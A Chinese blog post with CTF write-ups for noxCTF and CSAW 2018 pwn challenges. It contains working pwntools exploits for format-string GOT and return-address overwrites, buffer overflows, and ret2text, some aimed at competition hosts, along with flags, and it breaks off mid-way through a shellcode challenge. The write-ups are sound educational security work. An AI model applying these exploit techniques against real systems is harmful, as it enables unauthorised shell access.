<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">nox_CSAW部分pwn题解 | nepire的舰队</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "艦隊nepire";
  mashiro_option.author_name = "nepire";
  mashiro_option.site_url = "https://nepire.github.io/";
  mashiro_option.v_appId = "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz";
  mashiro_option.v_appKey = "EEpyRysaKmv7aOJjR1o9E4Eq";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "/images/cover/(0).jpg,/images/cover/(1).jpg,/images/cover/(2).jpg,/images/cover/(3).jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://nepire.github.io/">
          <img src="/images/title.ico">
        </a>
      </div>
      <div class="header-info">
        <p>渴求着能撼动世界的力量</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="github">
                    <img src="/images/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="sina">
                    <img src="/images/social/sina.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="wangyiyun">
                    <img src="/images/social/wangyiyun.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="zhihu">
                    <img src="/images/social/zhihu.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="email">
                    <img src="/images/social/email.svg">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="/images/social/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">艦隊</span>
            <span class="shironeko">nepire</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/生活/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          生活
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/资源/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          资源
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/tags/悦读/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          书单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                      <li>
                        <a href="/theme-sakura/">
                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                          主题
                        </a>
                      </li>
                    
                      <li>
                        <a href="/lab/">
                          <i class="fa fa-cogs" aria-hidden="true"></i>
                          Lab
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/client/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
                    客户端
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
          <header class="entry-header">
            <h1 class="entry-title">nox_CSAW部分pwn题解</h1>
            <p class="entry-census">nepire&nbsp;·&nbsp;2019-11-5&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>

            <hr>
          </header>
        
        <div class="entry-content">
          <p>暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。</p>
<p>本文首发于<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247485613&amp;idx=1&amp;sn=d523230fb3778620baaddaf987b7d7f3&amp;chksm=fbf792ddcc801bcb81ffd41bc211bdd74c91cb80baecaaec5cb37b682b7afe3bf29dcb2f72d6&amp;mpshare=1&amp;scene=23&amp;srcid=1009d0fGRYWnkyimpbjdG7sm#" target="_blank" rel="noopener">安恒网络空间安全讲武堂</a></p>
<h3 id="NOXCTF"><a href="#NOXCTF" class="headerlink" title="NOXCTF"></a>NOXCTF</h3><h4 id="PWN—believeMe-378"><a href="#PWN—believeMe-378" class="headerlink" title="PWN—believeMe(378)"></a>PWN—believeMe(378)</h4><p>惯例先走一遍file+checksec检查</p>
<pre><code class="bash">➜  believeMe file believeMe
believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
➜  believeMe checksec believeMe
[*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>再简单的运行下程序看看程序是什么样的结构</p>
<pre><code class="bash">➜  believeMe ./believeMe
Someone told me that pwning makes noxāle...
But......... how ????
aaaa
aaaa%  
➜  believeMe
</code></pre>
<p>然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞</p>
<pre><code class="c">.text:080487CC ; 10:   printf(s);
.text:080487CC                 sub     esp, 0Ch
.text:080487CF                 lea     eax, [ebp+s]
.text:080487D2                 push    eax             ; format
.text:080487D3                 call    _printf
</code></pre>
<p>这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9</p>
<pre><code class="bash">➜  believeMe ./believeMe
Someone told me that pwning makes noxāle...
But......... how ????
aaaa%9$x
aaaa61616161%                                                         
➜  believeMe
</code></pre>
<p>然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40</p>
<pre><code class="python">payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size=&#39;short&#39;)
</code></pre>
<p>然而当我们成功修改fflush_got为noxFlag的地址时会进入到一个死循环中，我们看一下noxFlag函数里面不难发现问题</p>
<pre><code class="c">void __noreturn noxFlag()
{
  char i; // [esp+Bh] [ebp-Dh]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  puts(s);
  fflush(stdout);//这里又调用了fflush函数，由于我们把fflush_got改成了noxFlag地址，这里相当递归调用noxFlag，形成死循环
  if ( stream )
  {
    for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
    {
      putchar(i);
      fflush(stdout);
    }
    fflush(stdout);
    fclose(stream);
  }
  else
  {
    puts(&quot;Can&#39;t read file \n&quot;);
    fflush(stdout);
  }
  exit(0);
}
</code></pre>
<p>当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了</p>
<p>我们gdb把断点下在printf调试一下，先查看下堆栈</p>
<pre><code class="bash">gdb-peda$ stack 30
0000| 0xffffcf1c --&gt; 0x80487d8 (&lt;main+129&gt;:    add    esp,0x10)
0004| 0xffffcf20 --&gt; 0xffffcf44 (&quot;aaaa%21$x&quot;)
0008| 0xffffcf24 --&gt; 0x804890c --&gt; 0xa (&#39;\n&#39;)
0012| 0xffffcf28 --&gt; 0xf7fb45a0 --&gt; 0xfbad2288
0016| 0xffffcf2c --&gt; 0x8f17
0020| 0xffffcf30 --&gt; 0xffffffff
0024| 0xffffcf34 --&gt; 0x2f (&#39;/&#39;)
0028| 0xffffcf38 --&gt; 0xf7e0edc8 --&gt; 0x2b76 (&#39;v+&#39;)
0032| 0xffffcf3c --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;)
0036| 0xffffcf40 --&gt; 0x8000
0040| 0xffffcf44 (&quot;aaaa%21$x&quot;)
0044| 0xffffcf48 (&quot;%21$x&quot;)
0048| 0xffffcf4c --&gt; 0xf7000078
0052| 0xffffcf50 --&gt; 0x1
0056| 0xffffcf54 --&gt; 0x0
0060| 0xffffcf58 --&gt; 0xf7e30a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
0064| 0xffffcf5c --&gt; 0x804885b (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
0068| 0xffffcf60 --&gt; 0x1
0072| 0xffffcf64 --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;)
0076| 0xffffcf68 --&gt; 0xffffd02c --&gt; 0xffffd239 (&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&quot;)
0080| 0xffffcf6c --&gt; 0xed1acd00
0084| 0xffffcf70 --&gt; 0xf7fb43dc --&gt; 0xf7fb51e0 --&gt; 0x0
0088| 0xffffcf74 --&gt; 0xffffcf90 --&gt; 0x1
0092| 0xffffcf78 --&gt; 0x0
0096| 0xffffcf7c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
--More--(25/30)
0100| 0xffffcf80 --&gt; 0xf7fb4000 --&gt; 0x1b1db0
0104| 0xffffcf84 --&gt; 0xf7fb4000 --&gt; 0x1b1db0
0108| 0xffffcf88 --&gt; 0x0
0112| 0xffffcf8c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0116| 0xffffcf90 --&gt; 0x1
</code></pre>
<p>我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag</p>
<p>(这里有一个挺坑的地方就是你在本地复现时终端运行得到地址和用pwntools得到的地址可能不一样，这块我还是不懂是什么原理，希望知道的师傅能讲一下学习一波)</p>
<p>EXP</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;)
#n = process(&#39;./believeMe&#39;)
n = remote(&#39;18.223.228.52&#39;,13337)

shell_addr = 0x804867b
#ret_addr = 0xffffd030 - 0x4
ret_addr = 0xffffdd30 - 0x4
payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size=&#39;short&#39;)
n.recvuntil(&#39;But......... how ????&#39;)
#n.sendline(&#39;%21$x&#39;)
n.sendline(payload)
n.interactive()
</code></pre>
<p>FLAG</p>
<pre><code>noxCTF{N3ver_7rust_4h3_F0rmat}
</code></pre><h4 id="PWN—The-Name-Calculator"><a href="#PWN—The-Name-Calculator" class="headerlink" title="PWN—The Name Calculator"></a>PWN—The Name Calculator</h4><p>惯例检查一遍文件</p>
<pre><code class="bash">➜  TheNameCalculator file TheNameCalculator
TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped
➜  TheNameCalculator checksec TheNameCalculator
[*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>简单过一遍程序，只有一个输入</p>
<pre><code class="bash">➜  TheNameCalculator ./TheNameCalculator
What is your name?
Ep3ius
I‘ve heard better
</code></pre>
<p>开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造<code>payload = &#39;a&#39;* (0x2c-0x10)+p32(0x6A4B825)</code>让v4在if判断时的值为0x6A4B825</p>
<pre><code>puts(&quot;What is your name?&quot;);
fflush(stdout);
read(0, &amp;buf, 0x20u);
fflush(stdin);
if ( v4 == 0x6A4B825 )
{
  secretFunc();
}
</code></pre><p>进入secretFunc函数后发现函数最末尾有个格式化字符串漏洞，并且可以通过改exit_got来实现跳转，但中间有一段对输入进行一个异或加密，加密方式很简单就不再赘述，最终要达到的就是输入’aaaa%12$x’能返回未加密时格式化字符串正确的参数就算成功了，剩下的就是普通的格式化字符串改got的标准套路了，不过输入的fmt_payload的大小限制在了27而如果我们直接用fmtstr_payload生成的payload的长度是超过这个大小的，恰巧的是exit_got和superSecretFunc的前两位相同都为0x0804，所以我们的payload就不需要再改exit_got的前两位使我们payload的长度缩减至21</p>
<pre><code>for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) )
    *i ^= 0x5F7B4153u;
</code></pre><p>encrypt</p>
<pre><code>def encrypt(enc):
    buf = list(enc)
    for i in range(0, len(buf) - 4):
        payload = &#39;&#39;.join(buf[i:i+4])
        key = u32(payload)^0x5F7B4153
        buf[i:i+4] = list(p32(key))
    return &#39;&#39;.join(buf)
</code></pre><p>EXP</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;)
n = process(&#39;./TheNameCalculator&#39;)
#n = remote(&#39;chal.noxale.com&#39;, 5678)
elf = ELF(&#39;./TheNameCalculator&#39;)

exit_got = elf.got[&#39;exit&#39;]
superSecretFunc_addr = 0x08048596
name = &#39;a&#39;*(0x2c-0x10)+p32(0x6A4B825)

def encrypt(enc):
    buf = list(enc)
    for i in range(0, len(buf) - 4):
        payload = &#39;&#39;.join(buf[i:i+4])
        key = u32(payload)^0x5F7B4153
        buf[i:i+4] = list(p32(key))
    return &#39;&#39;.join(buf)

def check_name():
    n.recvuntil(&#39;name?\n&#39;)
    n.send(name)

def secretFunc(payload):
    n.recvuntil(&#39;please&#39;)
    n.send(encrypt(payload))

check_name()

payload = fmtstr_payload(12,{exit_got:superSecretFunc_addr},write_size=&#39;short&#39;)[0:21]
offset = &#39;aaaa%12$x&#39;

secretFunc(payload)

n.interactive()
</code></pre>
<p>FLAG</p>
<pre><code>noxCTF{M1nd_7he_Input}
</code></pre><h3 id="CSAW-CTF"><a href="#CSAW-CTF" class="headerlink" title="CSAW CTF"></a>CSAW CTF</h3><h4 id="PWN—bigboy"><a href="#PWN—bigboy" class="headerlink" title="PWN—bigboy"></a>PWN—bigboy</h4><p>简单的bof类型题目，先检查文件</p>
<pre><code>➜  bigboy file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
➜  bigboy checksec boi
[*] &#39;/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>idaF5看一下程序逻辑</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+28h] [rbp-18h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  HIDWORD(v6) = 0xDEADBEEF;
  puts(&quot;Are you a big boiiiii??&quot;);
  read(0, &amp;buf, 24uLL);
  if ( HIDWORD(v6) == 0xCAF3BAEE )
    run_cmd(&quot;/bin/bash&quot;);
  else
    run_cmd(&quot;/bin/date&quot;);
  return 0;
}
</code></pre><p>本以为构造payload = ‘a’* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4</p>
<pre><code>
[-------------------------------------code-------------------------------------]
   0x40069b &lt;main+90&gt;:  mov    edi,0x0
   0x4006a0 &lt;main+95&gt;:  call   0x400500 &lt;read@plt&gt;
   0x4006a5 &lt;main+100&gt;: mov    eax,DWORD PTR [rbp-0x1c]
=&gt; 0x4006a8 &lt;main+103&gt;: cmp    eax,0xcaf3baee
   0x4006ad &lt;main+108&gt;: jne    0x4006bb &lt;main+122&gt;
   0x4006af &lt;main+110&gt;: mov    edi,0x40077c
   0x4006b4 &lt;main+115&gt;: call   0x400626 &lt;run_cmd&gt;
   0x4006b9 &lt;main+120&gt;: jmp    0x4006c5 &lt;main+132&gt;
[------------------------------------stack-------------------------------------]
0000| 0x7ffd1313f360 --&gt; 0x7ffd1313f488 --&gt; 0x7ffd131402a8 --&gt; 0x545100696f622f2e (&#39;./boi&#39;)
0008| 0x7ffd1313f368 --&gt; 0x10040072d
0016| 0x7ffd1313f370 (&#39;a&#39; &lt;repeats 16 times&gt;, &quot;\356\272\363\312\n\276\255&quot;, &lt;incomplete sequence \336&gt;)
0024| 0x7ffd1313f378 (&quot;aaaaaaaa\356\272\363\312\n\276\255&quot;, &lt;incomplete sequence \336&gt;)
0032| 0x7ffd1313f380 --&gt; 0xdeadbe0acaf3baee
0040| 0x7ffd1313f388 --&gt; 0x0
0048| 0x7ffd1313f390 --&gt; 0x7ffd1313f480 --&gt; 0x1
0056| 0x7ffd1313f398 --&gt; 0xcc79c30a8da0b800
[------------------------------------------------------------------------------] blue
Legend: code, data, rodata, value
0x00000000004006a8 in main ()
gdb-peda$ p $eax
$1 = 0xdeadbe0a
</code></pre><p>idaF5看不出什么东西，直接切汇编</p>
<pre><code>mov     dword ptr [rbp+v6+4], 0DEADBEEFh
mov     edi, offset s   ; &quot;Are you a big boiiiii??&quot;
call    _puts
lea     rax, [rbp+buf]
mov     edx, 18h        ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
mov     eax, dword ptr [rbp+v6+4]
cmp     eax, 0CAF3BAEEh
jnz     short loc_4006BB
</code></pre><p>这里我们可以很简单就看出原因所在，eax所存的指针指向的是rbp-0x20+4而buf的首地址是指向rbp-0x30,而if语句比较的相当于在0x4006A8时的eax寄存器的值与0xCAF3BAEE是否相等，而两者的差值并非是v6与buf在栈上的距离，而实际的距离应该是0x30-0x20+4</p>
<p>EXP</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
#n = process(&#39;./boi&#39;)
n = remote(&#39;pwn.chal.csaw.io&#39;,9000)
payload = &#39;a&#39;*(0x30-0x20+0x4)+p32(0xCAF3BAEE)
n.recvuntil(&#39;??&#39;)
#gdb.attach(n)
n.sendline(payload)

n.interactive()
</code></pre>
<p>FLAG</p>
<pre><code>flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
</code></pre><h4 id="PWN—get-it"><a href="#PWN—get-it" class="headerlink" title="PWN—get it"></a>PWN—get it</h4><pre><code>➜  get_it file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
➜  get_it checksec get_it
[*] &#39;/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>程序的逻辑很简单，一个gets溢出，也给了system(‘/bin/sh’)函数，虽然开了NX麻烦直接shellcode来getshell，但ret2text还是很简单的就直接给exp了</p>
<p>EXP</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
#n = process(&#39;./get_it&#39;)
n = remote(&#39;pwn.chal.csaw.io&#39;,9001)

give_shell = 0x04005b6
buf = &#39;a&#39;*(32+8)
payload = buf + p64(give_shell)

n.recvuntil(&#39;it??&#39;)
n.sendline(payload)

n.interactive()
</code></pre>
<p>FLAG</p>
<pre><code>flag{y0u_deF_get_itls}
</code></pre><h4 id="PWN—shell-gt-code"><a href="#PWN—shell-gt-code" class="headerlink" title="PWN—shell-&gt;code"></a>PWN—shell-&gt;code</h4><pre><code>➜  shellpointcode file shellpointcode
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
➜  shellpointcode checksec shellpointcode
[*] &#39;/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
</code></pre><p>很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的</p>
<pre><code>➜  shellpointcode ./shellpointcode
Linked lists are great!
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
aaaa
(15 bytes) Text for node 2:
bbbb
node1:
node.next: 0x7ffd53539c70
node.buffer: aaaa

What are your initials?
111
Thanks 111
</code></pre><p>简单分析调试后可以得到栈溢出后8byte后即为返回地址，我们在写完ret地址后接着写入‘/bin/sh’可以达到在开始执行shellcode时rsp里存放的是指向/bin/sh的指针，那么便可以利用mov rdi,rsp使‘/bin/sh\0’作为execve的参数来调用execve(‘/bin/sh’)来getshell</p>
<pre><code>[----------------------------------registers-----------------------------------]
RAX: 0x19
RBX: 0x0
RCX: 0x7f1f405832c0 (&lt;__write_nocancel+7&gt;:  cmp    rax,0xfffffffffffff001)
RDX: 0x7f1f40852780 --&gt; 0x0
RSI: 0x7ffea8fdff90 (&quot;Thanks &quot;, &#39;a&#39; &lt;repeats 11 times&gt;, &quot;h&amp;\376\250\376\177\n\nnode.buffer: H\211\347j;X1\366\231\017\005\n\n&quot;)
RDI: 0x1
RBP: 0x6161616161616161 (&#39;aaaaaaaa&#39;)
